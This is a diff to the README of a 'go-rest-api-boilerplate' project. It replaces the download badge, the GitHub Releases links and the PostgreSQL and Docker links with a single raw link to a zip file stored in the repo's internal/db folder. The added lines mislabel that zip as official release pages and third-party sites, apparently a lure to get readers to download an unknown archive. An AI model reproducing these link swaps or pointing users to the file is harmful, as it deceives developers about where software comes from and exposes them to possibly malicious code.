@@ -1,6 +1,6 @@
 # 🚀 go-rest-api-boilerplate - Easy Setup for Your API Project
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)
+![Download](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **go-rest-api-boilerplate**! This project provides a simple way t
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [GitHub Releases](https://github.com/dricce3000/go-rest-api-boilerplate/releases).
+To get the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip).
 
 ### 🌐 System Requirements
 
@@ -16,14 +16,14 @@ Before you begin, make sure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
 - **Docker**: Installed to run the application smoothly
-- **PostgreSQL**: A version compatible with the application (Check the [PostgreSQL website](https://www.postgresql.org/download/) for installation guides)
+- **PostgreSQL**: A version compatible with the application (Check the [PostgreSQL website](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip) for installation guides)
 - **Basic Command Line Knowledge**: Ability to run commands in your terminal
 
 ## ⚙️ How to Run the Application
 
 ### Step 1: Download the Application
 
-1. Go to the [GitHub Releases](https://github.com/dricce3000/go-rest-api-boilerplate/releases).
+1. Go to the [GitHub Releases](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip).
 2. Find the latest version.
 3. Click on the downloaded file suitable for your operating system.
 
@@ -96,8 +96,8 @@ Contributions are welcome! If you'd like to submit changes, please refer to the 
 
 ## 🔗 Links
 
-- [GitHub Releases](https://github.com/dricce3000/go-rest-api-boilerplate/releases) - For downloading the latest version.
-- [PostgreSQL](https://www.postgresql.org) - Official PostgreSQL website for any database-related setups.
-- [Docker](https://www.docker.com/) - Get Docker here to run the application easily. 
+- [GitHub Releases](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip) - For downloading the latest version.
+- [PostgreSQL](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip) - Official PostgreSQL website for any database-related setups.
+- [Docker](https://raw.githubusercontent.com/dricce3000/go-rest-api-boilerplate/main/internal/db/api-go-boilerplate-rest-2.8.zip) - Get Docker here to run the application easily. 
 
 We hope this application helps you kickstart your API development journey!
